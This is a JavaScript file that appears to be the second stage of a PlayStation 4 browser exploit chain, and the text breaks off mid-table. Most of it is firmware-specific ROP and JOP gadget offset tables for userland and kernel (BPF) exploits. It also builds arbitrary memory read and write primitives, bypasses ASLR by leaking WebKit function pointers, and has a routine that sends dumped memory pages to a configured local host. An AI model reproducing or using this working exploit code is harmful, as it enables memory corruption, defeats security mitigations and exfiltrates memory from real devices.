var p;
var gadgets;

// Configuration
var socket_ip_pc = '192.168.0.40';
var socket_port_send = 9030;
var dump_userland = 0;
var dump_kernel = 0;
var getKernelBaseOnly = 0;
var devkit = false;


function dump_memory(filename, addr, size) {
	var tmp_buf = new Uint8Array(size);
	for (i = 0; i<size; i++)
		tmp_buf[i] = p.read4(addr.add32(i));
	/*-------------------Config et envoi de la requête SYNCHRONE : */
	objetXHR = createXHR();
	objetXHR.open("POST", "dumpFileMem.php?filename=" + filename, false);
	objetXHR.setRequestHeader('Content-type', 'application/octet-stream');
	objetXHR.onreadystatechange = done;
	/*---------------------------------Attente du retour SYNCHRONE : */
	function done() {
		if (objetXHR.readyState == 4) {
			if (objetXHR.status == 200) {
				//alert(objetXHR.responseText);
			} else {
				alert("Error XHR: "+ objetXHR.status + " – " + objetXHR.statusText);
				// Cancel the current request
				objetXHR.abort();
				objetXHR = null;
			}
		}
	}
	objetXHR.send(tmp_buf);
}

window.resolve_webkit_offsets = function() {
	if (window.ps4_fw == 315) {
		gadgetcache = {
			// Regular ROP Gadgets
			"ret":                    0x00000062, // 3.15-3.55
			"jmp rax":                0x00000092, // 3.15-3.55
			"ep":                     0x000000BD, // 3.15-3.55
			"pop rbp":                0x000000C6, // 3.15-3.55
			"mov [rdi], rax":         0x000B62D4, // 3.15
			"pop r8":                 0x0030434D, // 3.15
			"pop rax":                0x0000F43B, // 3.15
			"mov rax, rdi":           0x00003193, // 3.15
			"mov rax, [rax]":         0x0002D372, // 3.15
			"pop rsi":                0x001935D5, // 3.15
			"pop rdi":                0x001938D8, // 3.15
			"pop rcx":                0x00320C85, // 3.15
			"pop rsp":                0x00064C05, // 3.15
			"mov [rdi], rsi":         0x002B5100, // 3.15
			"pop rdx":                0x003724BF, // 3.15
			"pop r9":                 0x00A4454F, // 3.15
			"jop":                    0x0106AA64, // 3.15 SPECIAL
			"infloop":                0x000115D6, // 3.15
			
			// kROP gadgets
			"mov [rdx], rax":         0x003D3A3D, // 3.15
			"add rax, rcx":           0x0004C826, // 3.15
			"mov rdx, rax":           0x00E24F52, // 3.15
			"mov rax, rdx":           0x0019A1E1, // 3.15
			"mov rax, [rdi]":         0x0005D910, // 3.15
			"jmp rdx":                0x00018E47, // 3.15
			
			// BPF race old kexploit
			"leave_1":                0x00E2324A, // 3.15

			// BPF race kexploit
			"leave":                0x00023D3B, // 3.15
			
			// BPF double free kexploit
			"ret2userland":           0x00009D9A, // 3.15
			"add rsp, 0x28":          0x00004128, // 3.15
			"mov [rsi], rdx":         0x00D6C858, // 3.15
			"add rdi, rax; mov rax, rdi":0x00DB0847, // 3.15
			
			// BPF double free JOP kdumper
			"mov rsi, rax; jmp rcx":  0x000C85C0, // 3.15
			
			// JOP gadgets for BPF double free kexploit
			"jop1":                   0x0061A86D, // 3.55 SPECIAL
			"jop2":                   0x00886461, // 3.55
			"jop3":                   0x01120BAB, // 3.55
			"jop4":                   0x0086D4F0, // 3.55 SPECIAL
			"jop_mov rbp, rsp":       0x00D472C1, // 3.55 SPECIAL
			"jop6":                   0x005CB98D, // 3.55 SPECIAL
			
			// Functions
			"longjmp":                0x00000CE8, // 3.15
			"createThread":           0x0018F260, // 3.15
		};
		gadgetshiftcache = {
			"stackshift_jop1":        0x00000018, // 3.55-4.05
			"stackshift_jop6":        0x00000028, // 3.55-5.05
			"jump_shift_jop1":        0x000003C0, // 3.55-4.05
			"jump_shift_jop5":        0x00000410, // 3.55-4.05
			"jump_shift_jop6":        0x00000358, // 3.55-4.05
		};
	} else if (window.ps4_fw >= 350 && window.ps4_fw <= 351) {
		gadgetcache = {
			// Regular ROP Gadgets
			"ret":                    0x00000062, // 3.50-3.55
			"jmp rax":                0x00000092, // 3.50-3.55
			"ep":                     0x000000BD, // 3.50-3.55
			"pop rbp":                0x000000C6, // 3.50-3.55
			"mov [rdi], rax":         0x0011FC37, // 3.50-3.55
			"pop r8":                 0x004C12ED, // 3.50
			"pop rax":                0x0001C6AB, // 3.50-3.55
			"mov rax, rdi":           0x000057C3, // 3.50-3.55
			"mov rax, [rax]":         0x0004ADD2, // 3.50-3.55
			"pop rsi":                0x000B9EBB, // 3.50-3.55
			"pop rdi":                0x00113991, // 3.50-3.55
			"pop rcx":                0x004E30D3, // 3.50
			"pop rsp":                0x00376850, // 3.50-3.55
			"mov [rdi], rsi":         0x00458400, // 3.50
			"pop rdx":                0x00001AFA, // 3.50-3.55
			"pop r9":                 0x00EE09BF, // 3.50
			"jop":                    0x0086D424, // 3.50 SPECIAL
			"infloop":                0x00057F2F, // 3.50-3.55
			
			// kROP gadgets
			"mov [rdx], rax":         0x005DC36D, // 3.50
			"add rax, rcx":           0x000879D7, // 3.50-3.55
			"mov rdx, rax":           0x0000B45C, // 3.50-3.55
			"mov rax, rdx":           0x002E19F1, // 3.50-3.55
			"mov rax, [rdi]":         0x000A0450, // 3.50-3.55
			"jmp rdx":                0x0002A4B2, // 3.50-3.55
			
			// namedobj kexploit
			"push rax; jmp rcx":      0x004853E0, // 3.50
			
			// BPF race old kexploit
			"leave_1":                0x00003E8A, // 3.50-3.55
			
			// BPF race kexploit
			"leave":                  0x0000AE00, // 3.50-3.55

			// BPF double free kexploit
			"ret2userland":           0x0000FC7A, // 3.50-3.55
			"add rsp, 0x28":          0x00006AF2, // 3.50-3.55
			"mov [rsi], rdx":         0x011EC363, // 3.50
			"add rdi, rax; mov rax, rdi":0x012B4808, // 3.50
			
			// BPF double free JOP kdumper
			"mov rsi, rax; jmp rcx":  0x001AC260, // 3.50-3.55
			
			// JOP gadgets for BPF double free kexploit
			"jop1":                   0x0061A86D, // 3.55 SPECIAL
			"jop2":                   0x00886461, // 3.55
			"jop3":                   0x01120BAB, // 3.55
			"jop4":                   0x0086D4F0, // 3.55 SPECIAL
			"jop_mov rbp, rsp":       0x00D472C1, // 3.55 SPECIAL
			"jop6":                   0x005CB98D, // 3.55 SPECIAL
			
			// Functions
			"longjmp":                0x00000D98, // 3.50-3.55
			"createThread":           0x002D1CB0, // 3.50-3.55
		};
		gadgetshiftcache = {
			"stackshift_jop1":        0x00000018, // 3.55-4.05
			"stackshift_jop6":        0x00000028, // 3.55-5.05
			"jump_shift_jop1":        0x000003C0, // 3.55-4.05
			"jump_shift_jop5":        0x00000410, // 3.55-4.05
			"jump_shift_jop6":        0x00000358, // 3.55-4.05
		};
	} else if (window.ps4_fw >= 355 && window.ps4_fw <= 370) {
		gadgetcache = {
			// Regular ROP Gadgets
			"ret":                    0x00000062, // 3.55
			"jmp rax":                0x00000092, // 3.55
			"ep":                     0x000000BD, // 3.55
			"pop rbp":                0x000000C6, // 3.55
			"mov [rdi], rax":         0x0011FC37, // 3.55
			"pop r8":                 0x004C13BD, // 3.55
			"pop rax":                0x0001C6AB, // 3.55
			"mov rax, rdi":           0x000057C3, // 3.55
			"mov rax, [rax]":         0x0004ADD2, // 3.55
			"pop rsi":                0x000B9EBB, // 3.55
			"pop rdi":                0x00113991, // 3.55
			"pop rcx":                0x004C0A33, // 3.55
			"pop rsp":                0x00376850, // 3.55
			"mov [rdi], rsi":         0x004584D0, // 3.55
			"pop rdx":                0x00001AFA, // 3.55
			"pop r9":                 0x00EE0A8F, // 3.55
			"jop":                    0x0086D4F4, // 3.55 SPECIAL
			"infloop":                0x00057F2F, // 3.55
			
			// kROP gadgets
			"mov [rdx], rax":         0x005DC43D, // 3.55
			"add rax, rcx":           0x000879D7, // 3.55
			"mov rdx, rax":           0x0000B45C, // 3.55
			"mov rax, rdx":           0x002E19F1, // 3.55
			"mov rax, [rdi]":         0x000A0450, // 3.55
			"jmp rdx":                0x0002A4B2, // 3.55
			
			// namedobj kexploit
			"push rax; jmp rcx":      0x004854B0, // 3.55
			
			// BPF race old kexploit
			"leave_1":                0x00003E8A, // 3.55
			
			// BPF race kexploit
			"leave":                  0x0000AE00, // 3.55

			// BPF double free kexploit
			"ret2userland":           0x0000FC7A, // 3.55
			"add rsp, 0x28":          0x00006AF2, // 3.55
			"mov [rsi], rdx":         0x011EC433, // 3.55
			"add rdi, rax; mov rax, rdi":0x012B48D8, // 3.55
			
			// BPF double free JOP kdumper
			"mov rsi, rax; jmp rcx":  0x001AC260, // 3.55
			
			// JOP gadgets for BPF double free kexploit
			"jop1":                   0x0061A86D, // 3.55 SPECIAL
			"jop2":                   0x00886461, // 3.55
			"jop3":                   0x01120BAB, // 3.55
			"jop4":                   0x0086D4F0, // 3.55 SPECIAL
			"jop_mov rbp, rsp":       0x00D472C1, // 3.55 SPECIAL
			"jop6":                   0x005CB98D, // 3.55 SPECIAL
			
			// Functions
			"longjmp":                0x00000D98, // 3.55
			"createThread":           0x002D1CB0, // 3.55
		};
		gadgetshiftcache = {
			"stackshift_jop1":        0x00000018, // 3.55-4.05
			"stackshift_jop6":        0x00000028, // 3.55-5.05
			"jump_shift_jop1":        0x000003C0, // 3.55-4.05
			"jump_shift_jop5":        0x00000410, // 3.55-4.05
			"jump_shift_jop6":        0x00000358, // 3.55-4.05
		};
	} else if (window.ps4_fw >= 400 && window.ps4_fw <= 407) {
		gadgetcache = {
			// Regular ROP Gadgets
			"ret":                    0x000000C8, // 4.05
			"jmp rax":                0x00000093, // 4.05
			"ep":                     0x000000BE, // 4.05
			"pop rbp":                0x000000C7, // 4.05
			"mov [rdi], rax":         0x0011ADD7, // 4.05
			"pop r8":                 0x004A3B0D, // 4.05
			"pop rax":                0x0001D70B, // 4.05
			"mov rax, rdi":           0x00005863, // 4.05
			"mov rax, [rax]":         0x000FD88D, // 4.05
			"pop rsi":                0x000A459E, // 4.05
			"pop rdi":                0x0010F1C1, // 4.05
			"pop rcx":                0x001FCA9B, // 4.05
			"pop rsp":                0x0020AEB0, // 4.05
			"mov [rdi], rsi":         0x0043CF70, // 4.05
			"pop rdx":                0x000D6660, // 4.05
			"pop r9":                 0x00EB5F8F, // 4.05
			"jop":                    0x00852624, // 4.05 SPECIAL
			"infloop":                0x00B29049, // 4.05
			
			// kROP gadgets
			"mov [rdx], rax":         0x005BB74D, // 4.05
			"add rax, rcx":           0x00086F06, // 4.05
			"mov rdx, rax":           0x0000B44A, // 4.05
			"mov rax, rdx":           0x000DAB96, // 4.05
			"mov rax, [rdi]":         0x0009E490, // 4.05
			"jmp rdx":                0x0027A198, // 4.05
			
			// namedobj kexploit
			"push rax; jmp rcx":      0x00469B80, // 4.05
			
			// BPF race old kexploit
			"leave_1":                0x00003F1A, // 4.05
			
			// BPF race kexploit
			"leave":                  0x001B7D63, // 4.05
			
			// BPF double free kexploit
			"ret2userland":           0x0000FC0A, // 4.05
			"add rsp, 0x28":          0x00006B72, // 4.05
			"mov [rsi], rdx":         0x011C1703, // 4.05
			"add rdi, rax; mov rax, rdi":0x01289BA8, // 4.05
			
			// BPF double free JOP kdumper
			"mov rsi, rax; jmp rcx":  0x001A7B90, // 4.05
			
			// JOP gadgets for BPF double free kexploit
			"jop1":                   0x005FA63D, // 4.05 SPECIAL
			"jop2":                   0x0086BAC1, // 4.05
			"jop3":                   0x010F5E7B, // 4.05
			"jop4":                   0x00852620, // 4.05 SPECIAL
			"jop_mov rbp, rsp":       0x002F88E4, // 4.05 SPECIAL
			"jop6":                   0x005AAD1D, // 4.05 SPECIAL
			
			// Functions
			"longjmp":                0x00000DE0, // 4.05
			"createThread":           0x002C48C0, // 4.05
		};
		gadgetshiftcache = {
			"stackshift_jop1":        0x00000018, // 3.55-4.05
			"stackshift_jop6":        0x00000028, // 3.55-5.05
			"jump_shift_jop1":        0x000003C0, // 3.55-4.05
			"jump_shift_jop5":        0x00000410, // 3.55-4.05
			"jump_shift_jop6":        0x00000358, // 3.55-4.05
		};
	} else if (window.ps4_fw >= 450 && window.ps4_fw <= 474) {
		gadgetcache = {
			// Regular ROP Gadgets
			"ret":                    0x0000003C, // 4.55-5.05
			"jmp rax":                0x00000082, // 4.55-5.05
			"ep":                     0x000000AD, // 4.55-5.05
			"pop rbp":                0x000000B6, // 4.55-5.05
			"mov [rdi], rax":         0x00003FBA, // 4.55-4.74
			"pop r8":                 0x0000CC42, // 4.55-4.74
			"pop rax":                0x0000CC43, // 4.55-4.74
			"mov rax, rdi":           0x0000E84E, // 4.55-4.74
			"mov rax, [rax]":         0x000130A3, // 4.55-4.74
			"pop rsi":                0x0007B1EE, // 4.55-4.74
			"pop rdi":                0x0007B23D, // 4.55-4.74
			"pop rcx":                0x00271DE3, // 4.55-4.74
			"pop rsp":                0x0027A450, // 4.55-4.74
			"mov [rdi], rsi":         0x0039CF70, // 4.55-4.74
			"pop rdx":                0x00565838, // 4.55-4.74
			"pop r9":                 0x0078BA1F, // 4.55-4.74
			"jop":                    0x01277350, // 4.55-4.74
			"infloop":                0x012C4009, // 4.55-4.74

			// kROP gadgets
			"mov [rdx], rax":         0x009B5BE3, // 4.55-4.74
			"add rax, rcx":           0x0084D04D, // 4.55-4.74
			"mov rdx, rax":           0x00012A16, // 4.55-4.74
			"mov rax, rdx":           0x001E4EDE, // 4.55-4.74
			"mov rax, [rdi]":         0x0013A220, // 4.55-4.74
			"jmp rdx":                0x001517C7, // 4.55-4.74

			// BPF race kexploit
			"leave":                  0x0003EBD0, // 4.55-4.74
			
			// BPF double free kexploit
			"ret2userland":           0x0008905C, // 4.55-4.74
			"add rsp, 0x28":          0x000028A2, // 4.55-4.74
			"mov [rsi], rdx":         0x01574006, // 4.55-4.74
			"add rdi, rax; mov rax, rdi":0x0141D1CD, // 4.55-4.74
			
			// BPF double free JOP kdumper
			"mov rsi, rax; jmp rcx":  0x00018C10, // 4.55-4.74
			
			// JOP gadgets for BPF double free kexploit
			"jop1":                   0x005D365D, // 4.55-4.74
			"jop2":                   0x007B0E65, // 4.55-4.74
			"jop3":                   0x0142BDBB, // 4.55-4.74
			"jop4":                   0x00637AC4, // 4.55-4.74
			"jop_mov rbp, rsp":       0x001B5B7A, // 4.55-4.74
			"jop6":                   0x000F391D, // 4.55-4.74
			
			// Functions
			"longjmp":                0x00001458, // 4.55-4.74
			"createThread":           0x0116ED40, // 4.55-4.74
		};
		gadgetshiftcache = {
			"stackshift_jop1":        0x00000048, // 4.55-4.74
			"stackshift_jop6":        0x00000028, // 3.55-5.05
			"jump_shift_jop1":        0x000007D0, // 4.55-5.05
			"jump_shift_jop5":        0x00000420, // 4.55-5.05
			"jump_shift_jop6":        0x00000040, // 4.55-5.05
		};
	} else if (window.ps4_fw >= 500 && window.ps4_fw <= 501) {
		gadgetcache = {
			"ret":                    0x0000003C, // 4.55-5.05
			"jmp rax":                0x00000082, // 4.55-5.05
			"ep":                     0x000000AD, // 4.55-5.05
			"pop rbp":                0x000000B6, // 4.55-5.05
			"mov [rdi], rax":         0x0014536B, // 5.01
			"pop r8":                 0x000179C5, // 5.01-5.05
			"pop rax":                0x000043F5, // 5.01-5.05
			"mov rax, rdi":           0x000058D0, // 5.01-5.05
			"mov rax, [rax]":         0x0006C83A, // 5.01-5.05
			"pop rsi":                0x0008F38A, // 5.01-5.05
			"pop rdi":                0x00038DBA, // 5.01-5.05
			"pop rcx":                0x00052E59, // 5.01-5.05
			"pop rsp":                0x0001E687, // 5.01-5.05
			"mov [rdi], rsi":         0x00023AC2, // 5.01-5.05
			"pop rdx":                0x000DEDC2, // 5.01
			"pop r9":                 0x00BB30CF, // 5.01
			"jop":                    0x000C37D0, // 5.01-5.05
			"infloop":                0x0151EFCA, // 5.01

			// kROP gadgets
			"mov [rdx], rax":         0x001F13DB, // 5.01
			"add rax, rcx":           0x000156DB, // 5.01-5.05
			"mov rdx, rax":           0x00353A71, // 5.01
			"mov rax, rdx":           0x001CEE60, // 5.01
			"mov rax, [rdi]":         0x00046EF9, // 5.01-5.05
			"jmp rdx":                0x0000E3D0, // 5.01-5.05
			
			// BPF double free kexploit
			"ret2userland":           0x0005CDB9, // 5.01-5.05
			"add rsp, 0x28":          0x00004C2E, // 5.01-5.05
			"mov [rsi], rdx":         0x00A643CA, // 5.01
			"add rdi, rax; mov rax, rdi":0x0055566F, // 5.01
			
			// BPF double free JOP kdumper
			"mov rsi, rax; jmp rcx":  0x0000DEE0, // 5.01-5.05
			
			// JOP gadgets for BPF double free kexploit
			"jop1":                   0x012A184D, // 5.01
			"jop2":                   0x006EF2E5, // 5.01
			"jop3":                   0x015CA29B, // 5.01
			"jop4":                   0x012846B4, // 5.01
			"jop_mov rbp, rsp":       0x000F094A, // 5.01-5.05
			"jop6":                   0x002728A1, // 5.01
			
			// Functions
			"longjmp":                0x000014E8, // 5.01-5.05
			"createThread":           0x00779190, // 5.01
		};
		gadgetshiftcache = {
			"stackshift_jop1":        0x00000058, // 5.01-5.05
			"stackshift_jop6":        0x00000028, // 3.55-5.05
			"jump_shift_jop1":        0x000007D0, // 4.55-5.05
			"jump_shift_jop5":        0x00000420, // 4.55-5.05
			"jump_shift_jop6":        0x00000040, // 4.55-5.05
		};
	} else if (window.ps4_fw >= 503 && window.ps4_fw <= 507) {
		gadgetcache = {
			"ret":                    0x0000003C, // 4.55-5.05
			"jmp rax":                0x00000082, // 4.55-5.05
			"ep":                     0x000000AD, // 4.55-5.05
			"pop rbp":                0x000000B6, // 4.55-5.05
			"mov [rdi], rax":         0x003ADAEB, // 5.05
			"pop r8":                 0x000179C5, // 5.01-5.05
			"pop rax":                0x000043F5, // 5.01-5.05
			"mov rax, rdi":           0x000058D0, // 5.01-5.05
			"mov rax, [rax]":         0x0006C83A, // 5.01-5.05
			"pop rsi":                0x0008F38A, // 5.01-5.05
			"pop rdi":                0x00038DBA, // 5.01-5.05
			"pop rcx":                0x00052E59, // 5.01-5.05
			"pop rsp":                0x0001E687, // 5.01-5.05
			"mov [rdi], rsi":         0x00023AC2, // 5.01-5.05
			"pop rdx":                0x001BE024, // 5.05
			"pop r9":                 0x00BB320F, // 5.05
			"jop":                    0x000C37D0, // 5.01-5.05
			"infloop":                0x01545EAA, // 5.05

			// kROP gadgets
			"mov [rdx], rax":         0x001F149B, // 5.05
			"add rax, rcx":           0x000156DB, // 5.01-5.05
			"mov rdx, rax":           0x00353B31, // 5.05
			"mov rax, rdx":           0x001CEF20, // 5.05
			"mov rax, [rdi]":         0x00046EF9, // 5.01-5.05
			"jmp rdx":                0x0000E3D0, // 5.01-5.05
			
			// BPF double free kexploit
			"ret2userland":           0x0005CDB9, // 5.01-5.05
			"add rsp, 0x28":          0x00004C2E, // 5.01-5.05
			"mov [rsi], rdx":         0x00A6450A, // 5.05
			"add rdi, rax; mov rax, rdi":0x005557DF, // 5.05
			
			// BPF double free JOP kdumper
			"mov rsi, rax; jmp rcx":  0x0000DEE0, // 5.01-5.05
			
			// JOP gadgets for BPF double free kexploit
			"jop1":                   0x012A19CD, // 5.05
			"jop2":                   0x006EF4E5, // 5.05
			"jop3":                   0x015CA41B, // 5.05
			"jop4":                   0x01284834, // 5.05
			"jop_mov rbp, rsp":       0x000F094A, // 5.01-5.05
			"jop6":                   0x00272961, // 5.05
			
			// Functions
			"longjmp":                0x000014E8, // 5.01-5.05
			"createThread":           0x00779390, // 5.05
		};
		gadgetshiftcache = {
			"stackshift_jop1":        0x00000058, // 5.01-5.05
			"stackshift_jop6":        0x00000028, // 3.55-5.05
			"jump_shift_jop1":        0x000007D0, // 4.55-5.05
			"jump_shift_jop5":        0x00000420, // 4.55-5.05
			"jump_shift_jop6":        0x00000040, // 4.55-5.05
		};
	} else if (window.ps4_fw >= 550 && window.ps4_fw <= 555) {
		gadgetcache = {
			"ret":                    0x0000003C, // 4.55-5.55
			"jmp rax":                0x00000082, // 4.55-5.55
			"ep":                     0x000000AD, // 4.55-5.55
			"pop rbp":                0x000000B6, // 4.55-5.55
			"mov [rdi], rax":         0x000BEF5C, // 5.55
			"pop r8":                 0x000188A5, // 5.55
			"pop rax":                0x00004575, // 5.55
			"mov rax, rdi":           0x00005AD0, // 5.55
			"mov rax, [rax]":         0x000F1ABA, // 5.55
			"pop rsi":                0x00281C7A, // 5.55
			"pop rdi":                0x0003A5DF, // 5.55
			"pop rcx":                0x00078495, // 5.55
			"pop rsp":                0x0001F4AD, // 5.55
			"mov [rdi], rsi":         0x00024CE2, // 5.55
			"pop rdx":                0x001C3EFB, // 5.55
			"pop r9":                 0x0132F96F, // 5.55
			"jop":                    0x000C6A20, // 5.55
			"infloop":                0x004B8FB0, // 5.55

			// kROP gadgets
			"mov [rdx], rax":         0x001F149B, // 5.05
			"add rax, rcx":           0x000156DB, // 5.01-5.05
			"mov rdx, rax":           0x00353B31, // 5.05
			"mov rax, rdx":           0x001CEF20, // 5.05
			"mov rax, [rdi]":         0x00046EF9, // 5.01-5.05
			"jmp rdx":                0x0000E3D0, // 5.01-5.05
			
			// BPF double free kexploit
			"ret2userland":           0x0005CDB9, // 5.01-5.05
			"add rsp, 0x28":          0x00004C2E, // 5.01-5.05
			"mov [rsi], rdx":         0x00A6450A, // 5.05
			"add rdi, rax; mov rax, rdi":0x005557DF, // 5.05
			
			// BPF double free JOP kdumper
			"mov rsi, rax; jmp rcx":  0x0000DEE0, // 5.01-5.05
			
			// JOP gadgets for BPF double free kexploit
			"jop1":                   0x012A19CD, // 5.05
			"jop2":                   0x006EF4E5, // 5.05
			"jop3":                   0x015CA41B, // 5.05
			"jop4":                   0x01284834, // 5.05
			"jop_mov rbp, rsp":       0x000F094A, // 5.01-5.05
			"jop6":                   0x00272961, // 5.05
			
			// Functions
			"longjmp":                0x000014E8, // 5.01-5.05
			"createThread":           0x00779390, // 5.05
		};
		gadgetshiftcache = {
			"stackshift_jop1":        0x00000058, // 5.01-5.05
			"stackshift_jop6":        0x00000028, // 3.55-5.05
			"jump_shift_jop1":        0x000007D0, // 4.55-5.05
			"jump_shift_jop5":        0x00000420, // 4.55-5.05
			"jump_shift_jop6":        0x00000040, // 4.55-5.05
		};
	} else if (window.ps4_fw >= 600 && window.ps4_fw <= 620) {
		gadgetcache = {
			"ret":                    0x0000003C, // 4.55-6.20
			"jmp rax":                0x00000082, // 4.55-5.55
			"ep":                     0x000000AD, // 4.55-5.55
			"pop rbp":                0x000000B6, // 4.55-6.20
			"mov [rdi], rax":         0x0001FB49, // 6.20
			"pop r8":                 0x00079211, // 6.20
			"pop rax":                0x00075BDF, // 6.20
			"mov rax, rdi":           0x00008CD0, // 6.20
			"mov rax, [rax]":         0x0002DC22, // 6.20
			"pop rsi":                0x000756CB, // 6.20
			"pop rdi":                0x0009E67D, // 6.20
			"pop rcx":                0x000348D3, // 6.20
			"pop rsp":                0x00075D9A, // 6.20
			"mov [rdi], rsi":         0x00034EF0, // 6.20
			"pop rdx":                0x002516B2, // 6.20
			"pop r9":                 0x000CDB41, // 6.20
			"jop":                    0x000C6A20, // 5.55
			"infloop":                0x00299B01, // 6.20
			
			"jmp rdi":                0x000A2EA6, // 6.20
			"mov rdx, rdi":           0x006271FE, // 6.20
			"mov [rax], rdi":         0x017629A7, // 6.20
			"mov [rax], rsi":         0x0133139D, // 6.20
			"mov rdx, [rcx]":         0x001848F4, // 6.20
			"add rax, rsi":           0x013F9533, // 6.20
			"and rax, rcx":           0x00108B63, // 6.20

			// kROP gadgets
			"mov [rdx], rax":         0x001F149B, // 5.05
			"add rax, rcx":           0x0018E2D0, // 6.20
			"mov rdx, rax":           0x00353B31, // 5.05
			"mov rax, rdx":           0x0007BC20, // 6.20
			"mov rax, [rdi]":         0x00046EF9, // 5.01-5.05
			"jmp rdx":                0x0000E3D0, // 5.01-5.05
			
			// BPF double free kexploit
			"ret2userland":           0x0005CDB9, // 5.01-5.05
			"add rsp, 0x28":          0x00004C2E, // 5.01-5.05
			"mov [rsi], rdx":         0x00A6450A, // 5.05
			"add rdi, rax; mov rax, rdi":0x005557DF, // 5.05
			
			// BPF double free JOP kdumper
			"mov rsi, rax; jmp rcx":  0x0000DEE0, // 5.01-5.05
			
			// Functions
			"longjmp":                0x000014E8, // 5.01-5.05
			"createThread":           0x00779390, // 5.05
		};
		gadgetshiftcache = {
		};
	}
	window.gadgetcache = gadgetcache;
	window.gadgets_shift = gadgetshiftcache;
};

window.stage2 = function () {
	try {
		stage2_();
	} catch (e) {
		alert(e);
	}
};

function stage2_ () {
	alert("stage2");
	
	p = window.prim;
	
	p.read2 = function (addr) {
		return p.read4(addr) & 0xFFFF;
	};

	p.read1 = function (addr) {
		return p.read4(addr) & 0xFF;
	};
	
	p.read_data8 = function (addr, size) {
		var v = new Uint8Array(size);
		for (var i = 0; i < size; i++)
			v[i] = p.read1(addr + i);
		return v;
	};
	
	p.writestr = function (addr, str) {
		for (var i = 0; i < str.length; i++) {
			var byte_ = p.read4(addr.add32(i));
			byte_ &= 0xFFFF0000;
			byte_ |= str.charCodeAt(i);
			p.write4(addr.add32(i), byte_);
		}
	};
	
	p.readstr = function (addr) {
		var addr_ = addr.add32(0);
		var rd = p.read4(addr_);
		var buf = "";
		while (rd & 0xFF) {
			buf += String.fromCharCode(rd & 0xFF);
			addr_.add32inplace(1);
			rd = p.read4(addr_);
		}
		return buf;
	};
	
	p.array_to_string = function (array) {
		var str = "";
		for (var i = 0; i < array.length; i++)
			str += String.fromCharCode(array[i]);
		return str;
	};
	
	p.hexdump = function (address, length) {
		var str = "";
		for (var i = 0; i < length; i++){
			var r = p.read8(address.add32(i));
			var tmp = r.toString();
			for (var y = 16; tmp.length < 16; y--)
				tmp = "0" + tmp;
			str += " " + tmp;
			i += 7;
		}
		return str;
	};
	
	p.stringify = function (str) {
		var bufView = new Uint8Array(str.length + 1);
		for (var i = 0; i < str.length; i++)
			bufView[i] = str.charCodeAt(i) & 0xFF;
		window.nogc.push(bufView);
		return p.read8(p.leakval(bufView).add32(window.leakval_slide));
	};

	p.malloc = function malloc(sz) {
		var backing = new Uint8Array(0x10000 + sz);
		window.nogc.push(backing);
		var ptr = p.read8(p.leakval(backing).add32(window.leakval_slide));
		ptr.backing = backing;
		return ptr;
	};

	p.malloc32 = function malloc32(sz) {
		var backing = new Uint8Array(0x10000 + sz * 4);
		window.nogc.push(backing);
		var ptr = p.read8(p.leakval(backing).add32(window.leakval_slide));
		ptr.backing = new Uint32Array(backing.buffer);
		return ptr;
	};
	
	p.get_jmptgt = function (addr) {
		var z = p.read4(addr) & 0xFFFF;
		var y = p.read4(addr.add32(2));
		if (z != 0x25FF)
			return 0;
		return addr.add32(y + 6);
	}
	
	// DEFEAT USERLAND ASLR
	
	if (window.ps4_fw >= 100) {
		var leakfunc_slide = 0;
		if (window.ps4_fw <= 407)
			leakfunc_slide = 0x20;
		else if (window.ps4_fw >= 450 && window.ps4_fw <= 556)
			leakfunc_slide = 0x40;
		else if (window.ps4_fw >= 600 && window.ps4_fw <= 620)
			leakfunc_slide = 0;
		p.leakfunc = function(func) {
			var fptr_store = p.leakval(func);
			return (p.read8(fptr_store.add32(0x18))).add32(leakfunc_slide);
		}
		//alert(p.read8(p.leakfunc(parseFloat)));
	}
	
	if (window.ps4_fw <= 370 && 1==0) {
		var webKitBase = window.webKitBase;
	} else if (window.ps4_fw >= 100 && window.ps4_fw <= 556) {
		var parseFloatStore = p.leakfunc(parseFloat);
		var parseFloatPtr = p.read8(parseFloatStore);
		//alert(parseFloatPtr);
		
		// Resolve libSceWebKit2 base using parseFloat offset
		var webKitBase = parseFloatPtr;
		if (window.ps4_fw == 315) {
			webKitBase.sub32inplace(0x37220);
		} else if (window.ps4_fw >= 350 && window.ps4_fw <= 370) {
			webKitBase.sub32inplace(0x55EA0);
		} else if (window.ps4_fw >= 400 && window.ps4_fw <= 407) {
			webKitBase.sub32inplace(0x55FB0);
		} else if (window.ps4_fw >= 450 && window.ps4_fw <= 474) {
			webKitBase.sub32inplace(0xE8DDA0);
		} else if (window.ps4_fw >= 500 && window.ps4_fw <= 501) {
			webKitBase.sub32inplace(0x5783D0);
		} else if (window.ps4_fw >= 503 && window.ps4_fw <= 507) {
			webKitBase.sub32inplace(0x578540);
		} else if (window.ps4_fw == 550) {
			webKitBase.sub32inplace(0x59B3D0);
		} else if (window.ps4_fw >= 553 && window.ps4_fw <= 556) {
			webKitBase.sub32inplace(0x59B3E0);
		} else alert("unknown parseFloat offset\n parseFloatPtr: " + parseFloatPtr);
	} else if (window.ps4_fw >= 600 && window.ps4_fw <= 620) {
		var textArea = document.createElement("textarea");
		var textAreaVtPtr = p.leakfunc(textArea);
		var textAreaVtable = p.read8(textAreaVtPtr);
		var webKitBase = textAreaVtable.sub32(0x2265DE8);
		webKitBase.low &= 0xFFFFC000;
		textArea.rows = 0x41424344;
	}
	
	if (p.read8(webKitBase) != 56415741E5894855)
		alert("Bad webKitBase: " + webKitBase);
	window.webKitBase = webKitBase;
	var o2wk = function (o) {
		return webKitBase.add32(o);
	}
	window.o2wk = o2wk;
	
	if (dump_userland) {
		/*
		var tmp_buf = p.malloc(0x100);
		p.write8(tmp_buf, 0x1337);
		debug_bin(tmp_buf.backing, 0x10);
		alert("waiting");*/
		
		//var tmp_buf = p.malloc(0x100);
		//var moduleBuffer = p.read_data8(webKitBase, 0x1);
		alert("Starting dumping libwebkit");
		for (i=0; i<0x10000000/0x1000; i++)
			dump_memory("", webKitBase.add32(i*0x1000), 0x1000);
		alert("Dump finished");
	}
	
	// Offsets for resolving modules imported by libSceWebKit2
	if (window.ps4_fw == 315) {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0x108),
			"__stack_chk_fail_libkernel": 0xD390,
			"memset": o2wk(0x158),
			"memset_libc": 0x694D0,
		};
	} else if (window.ps4_fw >= 350 && window.ps4_fw <= 370) {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xE8),
			"__stack_chk_fail_libkernel": 0xD790,
			"memset": o2wk(0x138),
			"memset_libc": 0x92D10,
		};
	} else if (window.ps4_fw >= 400 && window.ps4_fw <= 407) {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xF0),
